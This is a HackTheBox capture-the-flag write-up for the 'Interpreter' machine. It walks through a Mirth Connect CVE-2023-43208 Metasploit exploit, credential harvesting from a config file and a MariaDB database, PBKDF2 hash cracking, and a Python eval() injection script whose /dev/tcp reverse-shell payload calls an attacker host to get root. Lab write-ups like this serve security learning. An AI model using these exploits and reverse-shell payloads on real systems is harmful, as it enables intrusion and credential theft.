# Interpreter

**Platform:** HackTheBox
**OS:** Linux
**Tags:** CVE-2023-43208, Mirth Connect, Java Deserialization, RCE, PBKDF2, eval() Injection, Deserialization, Remote Code Execution, Code Injection, Privilege Escalation
**Date:** 2026-05-05

Mirth Connect 4.4.0 exposed via HTTP/HTTPS. Unauthenticated RCE through a Java deserialization vulnerability (CVE-2023-43208) lands a shell as `mirth`. Credential harvesting from `mirth.properties` and a local MySQL database yields a PBKDF2 hash - cracked with rockyou to SSH in as a user. Root via Python `eval()` injection in a root-owned service listening on a Mirth-forwarded XML endpoint.

## 1. Enumeration

Three ports. Two of them Mirth Connect - HTTP and HTTPS on Jetty.

```bash
nmap -sV -sC <TARGET_IP> -Pn
```

Findings:
- 22/tcp - OpenSSH 9.2p1 (Debian)
- 80/tcp - Jetty - Mirth Connect (HTTP)
- 443/tcp - Jetty SSL - Mirth Connect (HTTPS)

Mirth Connect's REST API requires the `X-Requested-With` header. Queried the version endpoint to confirm the running version before looking for matching CVEs.

```bash
curl -sk https://<TARGET_IP>/api/server/version -H "X-Requested-With: XMLHttpRequest"
```

**Result:** Mirth Connect **4.4.0** confirmed. Vulnerable to CVE-2023-43208 (unauthenticated RCE via Java deserialization).

## 2. Initial Foothold: CVE-2023-43208

CVE-2023-43208 is an unauthenticated Java deserialization vulnerability in Mirth Connect's REST API. The Metasploit module handles payload generation and delivery - point it at port 443 (the SSL-enabled endpoint) and set a writable staging directory on the target.

```
use exploit/multi/http/mirth_connect_cve_2023_43208
set RHOSTS <TARGET_IP>
set RPORT 443
set LHOST <ATTACKER_IP>
set FETCH_WRITABLE_DIR /tmp
set payload cmd/unix/reverse_bash
exploit
```

**Result:** Reverse shell landed as `mirth`.

## 3. Credential Harvesting

As `mirth`, the Mirth Connect configuration file is readable. It holds the database connection string including plaintext credentials.

```bash
find / -name "mirth.properties" 2>/dev/null
cat /usr/local/mirthconnect/conf/mirth.properties
```

Findings:
- database.username: `mirthdb`
- database.password: `redacted`
- database.url: `jdbc:mariadb://localhost:3306/mc_bdd_prod`

Connected to MariaDB and enumerated the production database.

```bash
mysql -u mirthdb -p'<db_password>' mc_bdd_prod
```

```sql
SELECT * FROM PERSON;
-- Username: sedric

SELECT * FROM PERSON_PASSWORD;
-- Hash: <redacted>

SELECT * FROM CHANNEL\G
-- HL7 channel on port 6661
-- Forwards XML to http://127.0.0.1:54321/addPatient
-- Body: ${message.encodedData}
```

The `CHANNEL` entry is important: Mirth is forwarding incoming HL7 messages as XML to an internal HTTP service on port 54321. That endpoint becomes relevant for privilege escalation.

**Result:** User `sedric` found with a PBKDF2 hash. Internal service at `127.0.0.1:54321/addPatient` noted.

## 4. User: Hash Cracking

The hash is PBKDF2-HMAC-SHA1 - Hashcat mode 10900. Ran against rockyou.txt.

```bash
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:** Hash cracked. SSH'd in as `sedric` and read `/home/sedric/user.txt`.

## 5. Root: eval() Injection

Checked running processes as `sedric` to look for root-owned services.

```bash
ps aux | grep notif
```

- root: `/usr/bin/python3 /usr/local/bin/notif.py`

`notif.py` runs as root and listens on `127.0.0.1:54321/addPatient` - exactly the endpoint Mirth forwards XML to. It parses the incoming XML and passes the `firstname` field directly to Python's `eval()`. From the `mirth` shell, we can POST arbitrary XML to this endpoint via localhost.

Built a payload that base64-encodes a reverse shell and injects it via the `firstname` field:

```python
import urllib.request, base64
from urllib.request import Request

# reverse shell command
cmd = "bash -i >& /dev/tcp/<ATTACKER_IP>/9004 0>&1"
b64 = base64.b64encode(cmd.encode()).decode()

inj = f"{{exec(__import__('base64').b64decode('{b64}').decode())}}"
xml = f"<patient><firstname>{inj}</firstname><lastname>x</lastname></patient>"

req = Request(
    "http://127.0.0.1:54321/addPatient",
    data=xml.encode(),
    headers={"Content-Type": "application/xml"}
)
urllib.request.urlopen(req)
```

Set up a listener, then ran the script from the `mirth` shell:

```bash
# On attacker
nc -lvnp 9004

# On mirth shell
python3 /tmp/payload.py
```

**Result:** Root shell obtained. Read `/root/root.txt`.

## 6. Flags

- User: `redacted`
- Root: `redacted`
